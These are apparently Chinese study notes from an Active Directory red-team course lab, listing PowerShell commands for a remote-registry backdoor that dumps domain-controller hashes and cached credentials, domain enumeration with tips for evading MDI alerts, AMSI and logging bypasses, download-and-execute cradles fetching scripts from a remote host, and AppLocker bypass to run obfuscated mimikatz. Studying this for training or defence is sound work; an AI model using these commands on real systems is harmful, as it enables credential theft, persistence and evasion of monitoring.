<h4 id="Powershell远程的ACL修改"><a href="#Powershell远程的ACL修改" class="headerlink" title="Powershell远程的ACL修改"></a>Powershell远程的ACL修改</h4><p>正常情况下需要有被远程连接主机的本地管理员权限才可以使用<code>Enter-PSSession</code></p>
<p>同样可以通过RACE脚本来操作</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotePSRemoting</span> <span class="literal">-SamAccountName</span> student1 <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>在远程主机执行（在当前进程账户权限足够的情况下，使用当前用户凭据）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotePSRemoting</span> <span class="literal">-SamAccountName</span> student1 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>使用其他用户凭据(当前权限不够的情况下，用权限足够的账户)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotePSRemoting</span>  <span class="literal">-SamAccountName</span> student1 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-credential</span> Administrator <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>远程删除对应权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotePSRemoting</span> <span class="literal">-SamAccountName</span> student1  <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Remove</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<h4 id="远程注册表权限"><a href="#远程注册表权限" class="headerlink" title="远程注册表权限"></a>远程注册表权限</h4><p>为用户student1添加远程注册表的访问权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-RemoteRegBackdoor</span> <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-Trustee</span> student1 <span class="literal">-verpose</span></span><br></pre></td></tr></table></figure>

<p>作为student1 检索dcorp-dc机器帐户哈希</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-RemoteMachineAccountHash</span> <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>作为student1 检索dcorp-dc的本地账户哈希（包含administrator等账户）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-RemoteLocalAccountHash</span> <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>作为student1 检索dcorp-dc的域缓存凭据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Remotecachedcredential</span><span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>这里留这个后门，为了方便后续低权用户拿到DC的机器hash伪造银票力，做持久维权（桀桀桀</p>
<h2 id="02-domain-enumeration"><a href="#02-domain-enumeration" class="headerlink" title="02 domain enumeration"></a>02 domain enumeration</h2><h3 id="1-可能会有域用户的-description（描述）属性被写了明文敏感信息"><a href="#1-可能会有域用户的-description（描述）属性被写了明文敏感信息" class="headerlink" title="1.可能会有域用户的 description（描述）属性被写了明文敏感信息"></a>1.可能会有域用户的 <code>description</code>（描述）属性被写了明文敏感信息</h3><p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get_DomainUser -LDAPFilter &#x27;Description=*built*&#x27;|Select name,Description</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser -Filter &#x27;Description -like &quot;*built*&quot;&#x27; -Properties Description |select name,Description </span><br></pre></td></tr></table></figure>

<h3 id="2-找到域内实际使用的机器，可以通过登录次数来判断"><a href="#2-找到域内实际使用的机器，可以通过登录次数来判断" class="headerlink" title="2.找到域内实际使用的机器，可以通过登录次数来判断"></a>2.找到域内实际使用的机器，可以通过登录次数来判断</h3><p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer | select dnshostname</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer | select dnshostname,logonCount</span><br></pre></td></tr></table></figure>

<h3 id="3-枚举组"><a href="#3-枚举组" class="headerlink" title="3.枚举组"></a>3.枚举组</h3><p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainGroup</span></span><br></pre></td></tr></table></figure>

<p>通过组名来寻找包含关键字的组 （以admin关键字为例）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainGroup</span> *admin*</span><br></pre></td></tr></table></figure>

<p>如果像这样查询，会发现没有 <code>企业管理员</code>(Enterprise Admins) </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainGroup</span> *admin* | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>

<p>而当向域来请求时，将会看到企业管理员组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainGroup</span> *admin* <span class="literal">--Domain</span> moneycorp.local | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>

<p>企业管理员存在于根域中，允许访问所有的域控制器<br>而子域的域管理员可能无法直接访问到dc，这还需要再进行移动。</p>
<h3 id="sid是唯一标识，无法出现俩相同的"><a href="#sid是唯一标识，无法出现俩相同的" class="headerlink" title="sid是唯一标识，无法出现俩相同的"></a>sid是唯一标识，无法出现俩相同的</h3><p>500-1000 是预留的</p>
<h3 id="如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在-19-和-20-节课中学到）"><a href="#如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在-19-和-20-节课中学到）" class="headerlink" title="如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在 19 和 20 节课中学到）"></a>如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在 19 和 20 节课中学到）</h3><h3 id="4-枚举域管理员组人员"><a href="#4-枚举域管理员组人员" class="headerlink" title="4.枚举域管理员组人员"></a>4.枚举域管理员组人员</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-domainGroupMember -Identity &quot;domain Admins&quot; -Recure</span><br></pre></td></tr></table></figure>

<h3 id="5-通过用户名枚举用户所属组"><a href="#5-通过用户名枚举用户所属组" class="headerlink" title="5.通过用户名枚举用户所属组"></a>5.通过用户名枚举用户所属组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-domainGroupMember -Username &quot;student1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="6-列出本地-组-或-组成员"><a href="#6-列出本地-组-或-组成员" class="headerlink" title="6.列出本地 组 或 组成员"></a>6.列出本地 组 或 组成员</h3><p>需要注意，dc是一台特殊的机器，在dc列出本地组、组成员不需要特殊权限</p>
<p>而在其他成员机器上列出本地组、组成员，则需要administrator权限</p>
<p>列出机器上的本地组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetLocalGroup -computerName dcorp-dc</span><br></pre></td></tr></table></figure>

<p>列出机器上指定组的 组成员</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators</span><br></pre></td></tr></table></figure>

<h3 id="7-枚举-smbshare"><a href="#7-枚举-smbshare" class="headerlink" title="7.枚举 smbshare"></a>7.枚举 smbshare</h3><p>获取当前host的share</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ShareFinder -verbose</span><br></pre></td></tr></table></figure>

<p>获取当前域名中的敏感文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-FileFinder -verbose</span><br></pre></td></tr></table></figure>

<p>获取域中所有文件服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetFileserver</span><br></pre></td></tr></table></figure>

<p>枚举共享这部分，阿三推荐了</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/NetSPl/PowerHuntShares">https://github.com/NetSPl/PowerHuntShares</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-HuntsMBShares -NoPing -outputDirectory C:\AD\Tools -HostList C:AD\Tools\servers.txt</span><br></pre></td></tr></table></figure>

<p><strong>这个扫完了之后需要把html能拿出来看</strong></p>
<p>从opsec角度来看，阿三不建议把域控加入到扫描的 <code>servers.txt</code> 中，因为：如果枚举一个配置了MDI的域控，那域控会直接告警</p>
<p>快速创建和留下连接日志为4624、4634</p>
<h3 id="8-bloodhound遛狗"><a href="#8-bloodhound遛狗" class="headerlink" title="8.bloodhound遛狗"></a>8.bloodhound遛狗</h3><p>遛狗基于opensec角度来看，<code>-c ALL</code> 因为 <code>smb</code> 和 <code>ldap</code> 等对DC发起的请求有很大概率被mdi直接告警。</p>
<p>所以这里阿三建议手动指定扫描的方法 ，并且排除dc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Group,GPoLocalGroup,Session,Trusts,AcL,container,objectProps,SPNTargets,CertServices   --excludedcs</span><br></pre></td></tr></table></figure>

<p>然后是 local admin在4.0.3版本有，所以需要单独弄4.0.3的狗子</p>
<h3 id="9-SOAPHound"><a href="#9-SOAPHound" class="headerlink" title="9.SOAPHound"></a>9.SOAPHound</h3><p>SOAPHound并非使用ADDS，而是使用ADWS（active directory web）走9389端口来交互，这样就不走LDAP了。</p>
<p>使用方式如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SOAPHound.exe <span class="literal">--buildcache</span> <span class="literal">-c</span> <span class="string">&quot;C:\path\cache.txt&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>联动bloodhound的方式，这个SOAPHound支持转换为bloodhound的形式</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SOAPHound.exe <span class="literal">-c</span> <span class="string">&quot;C:\path\cache.txt&quot;</span> <span class="literal">--bhdump</span> <span class="literal">-o</span> <span class="string">&quot;C:\path\bloodhound-output&quot;</span> <span class="literal">--nolaps</span></span><br></pre></td></tr></table></figure>

<h3 id="10-域会话（session）枚举"><a href="#10-域会话（session）枚举" class="headerlink" title="10.域会话（session）枚举"></a>10.域会话（session）枚举</h3><p>(在大于等于2019版本时，需要本地管理员才可以列出session)</p>
<p>可以使用这个，他不需要远程的管理员权限也可以枚举session,它使用远程注册表查看 <code>HKEY_USERS</code> 的 <code>hive</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Leo4j/Invoke-SessionHunter">https://github.com/Leo4j/Invoke-SessionHunter</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SessionHunter</span> <span class="literal">-Failsafe</span></span><br></pre></td></tr></table></figure>

<p>站在opsec角度来看，为了避免触发DC的MDI，同样，采用列表查询的方式，剔除掉其中的DC</p>
<p>在枚举域机器上的session时 <code>Invoke-SessionHunter</code> 会更加实用一些</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SessionHunter</span> <span class="literal">-NoPortScan</span> <span class="literal">-Targets</span> <span class="string">&quot;C:\servers.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p>查找 <code>domain admin</code> 或者其他 <code>指定组</code> &#x2F; <code>用户</code> 存在session的机器，需要注意这个脚本是要在被查找得那台机器上有管理员权限才可以查看到。</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-domainUserLocation</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>查询指定的组&#x2F;用户存在session的机器</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-domainUserLocation</span> <span class="literal">-Verbose</span> <span class="literal">-UserGroupIdentity</span> <span class="string">&quot;RDPUsers&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个函数的原理是先通过 <code>Get-domainGroupMember</code> 获取用户，然后再 <code>Get-domainComputer</code> 获取域机器列表，然后对每个机器执行 ( <code>GET-NetSession</code> &#x2F; <code>Get-NetLoggedon</code> ) 枚举机器上的用户session和登录情况。(默认是寻找 <code>domain admins</code> )</p>
<p>要注意的是，因为也会枚举DC机器上的，这会导致MDI告警。</p>
<p>bypass的方式为不要枚举DC（哈哈哈哈</p>
<h3 id="11-查询用户被配置为本地管理员的机器-枚举"><a href="#11-查询用户被配置为本地管理员的机器-枚举" class="headerlink" title="11.查询用户被配置为本地管理员的机器 枚举"></a>11.查询用户被配置为本地管理员的机器 枚举</h3><p>查询当前域中 当前用户被配置为本地管理员的机器（可以远程过去的机器）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-LocalAdminaccess</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>要注意,<code>Find-LocalAdminaccess</code> 函数动作如下</p>
<p>首先使用 <code>Get-NetComputer</code> 从 <code>DC</code> 中获取域主机列表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetComputer</span></span><br></pre></td></tr></table></figure>
<p>然后在每一台机器上执行 <code>Invoke-checkLocalAdminAccess</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-checkLocalAdminAccess</span></span><br></pre></td></tr></table></figure>

<p>(当拿到的账户在当前机器并不是管理员，但可能在其他机器上为本地管理员)<br>对其他主机使用的话或者请求被阻止的情况下，可以用下面两个脚本远程wmi协议或者smb</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-WMILocalAdminAccess</span>.ps1</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-PSRemotingLocalAdminAccess</span>.ps1</span><br></pre></td></tr></table></figure>

<p>指定探测的域名范围</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-PSRemotingLocalAdminAccess</span>.ps1 <span class="literal">-domain</span> dollarcorp.moneycorp.local <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>要注意的是这些都是首先从DC枚举机器，然后再挨个机器尝试的，这种行为会留下 4624（登录成功） 和 4634（登录失败）</p>
<p>而且我们不仅要寻找本地管理员权限，还要寻找是否有特定的组或者用户的会话session</p>
<h2 id="03-powershell"><a href="#03-powershell" class="headerlink" title="03 powershell"></a>03 powershell</h2><h3 id="bypass-amsi"><a href="#bypass-amsi" class="headerlink" title="bypass amsi"></a>bypass amsi</h3><p>1.reveres strings</p>
<p>example</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)...</span><br><span class="line"></span><br><span class="line">变成</span><br><span class="line"></span><br><span class="line">$Strings = &quot;stekcoS.teN&quot;</span><br><span class="line"></span><br><span class="line">$class = ([regex]::Matches($String,&#x27;.&#x27;,&#x27;RightToLeft&#x27;)|ForEach&#123;$_.values&#125;) -join &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">像这样</span><br><span class="line"></span><br><span class="line">$strings=&#x27;paspsd&#x27;</span><br><span class="line"></span><br><span class="line"> $class = ([regex]::Matches($strings,&#x27;.&#x27;,&#x27;RightToLeft&#x27;)|ForEach&#123;$_.value&#125;) -join &#x27;&#x27;;$class</span><br><span class="line">dspsap</span><br></pre></td></tr></table></figure>

<p><strong>新版课程中开始推荐使用 Invisi-shell</strong></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/OmerYa/Invisi-Shell">https://github.com/OmerYa/Invisi-Shell</a></p>
</blockquote>
<ul>
<li><p>避免被记录powershell日志</p>
</li>
<li><p>powershell从内存加载很好用 绕过<code>powershell security</code></p>
</li>
</ul>
<hr>
<p>2.mimikatz bypass</p>
<p>课程中给到了一个powerkatz.all base64后再反转的方式</p>
<p>通过判断启动时候先检测drivers下vm等文件是否存在的形式，来确实是否在沙箱，其实还可以通过判断c盘下文件路径或者机器名等来确定</p>
<p>3.powershell一些概念和用法</p>
<ul>
<li>PowerShell is NOT powershell.exe. lt is theSystem.Management.Automation.dl</li>
</ul>
<h3 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import-module</span> Path (example : C:\AD\Tools\test.psd1)</span><br></pre></td></tr></table></figure>

<h3 id="列出模块中可用的命令"><a href="#列出模块中可用的命令" class="headerlink" title="列出模块中可用的命令"></a>列出模块中可用的命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Command</span> <span class="literal">-Module</span> &lt;modulename&gt; </span><br></pre></td></tr></table></figure>

<h3 id="powershell-下载"><a href="#powershell-下载" class="headerlink" title="powershell 下载"></a>powershell 下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex (New-object Net.webclient).downloadstring(&quot;http://test.com/test.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>↓这个在新版本windows已经被弃用了，会弹出来IE浏览器，如果直接拿来打印页面内容话根本获取不到内容..</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ie</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> InternetExplorer.Application;<span class="variable">$ie</span>.visible=<span class="variable">$False</span>;<span class="variable">$ie</span>.navigate(<span class="string">&quot;http://192.168.221.128&quot;</span>);</span><br><span class="line"><span class="variable">$response</span>=<span class="variable">$ie</span>.Document.body.innerHTML;</span><br><span class="line"><span class="built_in">write-host</span> <span class="variable">$response</span></span><br><span class="line"><span class="variable">$ie</span>.quit();</span><br><span class="line"><span class="built_in">iex</span> <span class="variable">$response</span>;</span><br></pre></td></tr></table></figure>

<p>比较新的↓</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://192.168.221.128/test.ps1&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>另一种，不知道为啥本地只能获取内容 <code>PSv3</code> 会提示没有</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PSv3 onwards <span class="literal">-iex</span> (<span class="built_in">iwr</span> <span class="string">&#x27;http://192.168.221.128/test.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>通过xml</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$h</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> Msxml2.XMLHTTP;</span><br><span class="line"><span class="variable">$h</span>.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.221.128/test.ps1&quot;</span>,<span class="variable">$False</span>);</span><br><span class="line"><span class="variable">$h</span>.send();</span><br><span class="line"><span class="built_in">iex</span> <span class="variable">$h</span>.responseText;</span><br></pre></td></tr></table></figure>

<p>.net 形式的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#调用HttpWebRequest的Create方法</span></span><br><span class="line"><span class="variable">$wr</span> = [<span class="type">System.NET.WebRequest</span>]::Create(<span class="string">&quot;http://192.168.221.128/test.ps1&quot;</span>)</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$wr</span>.GetResponse();</span><br><span class="line"><span class="comment">#转responsse 换为 StreamReader 然后readToEnd</span></span><br><span class="line"><span class="built_in">IEX</span> ([<span class="type">System.IO.StreamReader</span>](<span class="variable">$r</span>.GetResponseStream())).ReadToEnd()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">IEX</span> ([<span class="type">System.IO.StreamReader</span>](([<span class="type">System.NET.WebRequest</span>]::Create(<span class="string">&quot;http://192.168.221.128/test.ps1&quot;</span>)).GetResponse()).GetResponseStream()).ReadToEnd()</span><br></pre></td></tr></table></figure>

<p>5.1 版本的 powershell记录 开始记录日志</p>
<ul>
<li><p>4104</p>
</li>
<li><p>4103</p>
</li>
</ul>
<h3 id="powershell-语言模式"><a href="#powershell-语言模式" class="headerlink" title="powershell 语言模式"></a>powershell 语言模式</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.5&viewFallbackFrom=powershell-7.3">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.5&amp;viewFallbackFrom=powershell-7.3</a></p>
</blockquote>
<p>powershell中有四种语言模式</p>
<ul>
<li>FullLanguage</li>
<li>RestrictedLanguage</li>
<li>ConstrainedLanguage （于Powershell3.0版本引入）</li>
<li>NoLanguage</li>
</ul>
<p>查看当前语言模式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>

<p>按照权限开放度排序</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FullLanguage &gt; RestrictedLanguage &gt; ConstrainedLanguage &gt; NoLanguage</span><br></pre></td></tr></table></figure>

<p>在crtp，其使用规避 <code>ConstrainedLanguage</code> 或受限语言模式是使用 <code>invishell</code> 中的bat来加载dll。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RunWithRegistryNonAdmin.bat</span><br></pre></td></tr></table></figure>

<p>或有admin权限的话执行下面这个</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RunWithPathAsAdmin.bat</span><br></pre></td></tr></table></figure>

<p>要注意的是 如果如果主机上有 <code>applocker</code> 或 <code>Device Guard</code> 这样的程序应用白名单解决方案或者执行规则（Execution Rule），<code>powershell</code> 将会被降级到<code>ConstrainedLanguage</code> 模式 。</p>
<h4 id="applocker"><a href="#applocker" class="headerlink" title="applocker"></a>applocker</h4><p><strong>注：applocker采用的是白名单模式。</strong></p>
<p>在这个lab中adminsrv机器开启了applocker</p>
<p>查看当前机器applocker是否开启（有权限的话）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2</span><br></pre></td></tr></table></figure>

<p>查看 <code>applocker</code> 规则</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ApplockerPolicy</span> <span class="literal">-Effective</span> </span><br></pre></td></tr></table></figure>

<p>进一步筛选查看白名单路径等</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br></pre></td></tr></table></figure>

<p>但当前用户在这台运行了 <code>applocker</code> 机器上有管理员权限时，有多种方式关闭掉applocker</p>
<p>不过这个实验室里做了多种限制使得applocker并不容易被关掉，首先采用配置白名单目录的配置缺陷来做。</p>
<p>这里通过筛选 <code>applocker</code> 策略发现，下面的目录被允许执行脚本等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%PROGRAMFILES%\*&#125;</span><br></pre></td></tr></table></figure>

<p>将混淆过的mimikatz脚本，这个 <code>Invoke-mimi.ps1</code> 传输到这个机器对应的白名单目录下，即可使用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy-item</span> C:\AD\Tools\<span class="built_in">Invoke-mimi</span>.ps1 \\dcorp<span class="literal">-adminsrv</span>.dollarcorp.moneycorp.local\C<span class="variable">$</span>\<span class="string">&#x27;Program Files&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后是通过用户所属的组对 <code>Applocker</code> 的组策略权限有编辑权限，来删除<code>Applocker</code>执行规则。</p>
<p>组策略控制台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpmc.msc</span><br></pre></td></tr></table></figure>

<p>选中编辑applocker策略</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Applocked-&gt;applocker（Edit）</span><br></pre></td></tr></table></figure>

<p>找到applocker具体编辑项目，删除执行规则（Execution Rule）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows Settings -&gt; Security Settings -&gt; Application control Policies -&gt; Applocker -&gt; Execution Rules -&gt; (Deleted Target Rule)</span><br></pre></td></tr></table></figure>

<h3 id="powershell执行脚本受限"><a href="#powershell执行脚本受限" class="headerlink" title="powershell执行脚本受限"></a>powershell执行脚本受限</h3><p>当前为 <code>ConstrainedLanguage</code> 模式的话将没有权限带着参数调用ps1脚本等。</p>
<p>所以这里比如执行 <code>Invoke-mimi.ps1</code>,原本是需要带上参数的</p>
<p>但是这里可以修改脚本，在脚本执行最后添加执行 <code>mimikatz</code> 命令</p>
